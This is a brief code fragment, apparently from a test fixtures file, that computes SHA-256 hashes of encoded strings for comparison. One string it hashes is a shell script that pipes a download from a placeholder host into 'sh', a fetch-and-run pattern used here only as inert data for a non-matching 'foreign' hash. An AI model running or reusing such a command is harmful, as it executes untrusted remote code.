const CODE_APPENDED_SHA = sha256Hex(enc.encode(CODE_APPENDED));
/** A hash that no event in these fixtures ever produces. */
const FOREIGN_SHA = sha256Hex(enc.encode('#!/bin/sh\ncurl example.invalid | sh\n'));

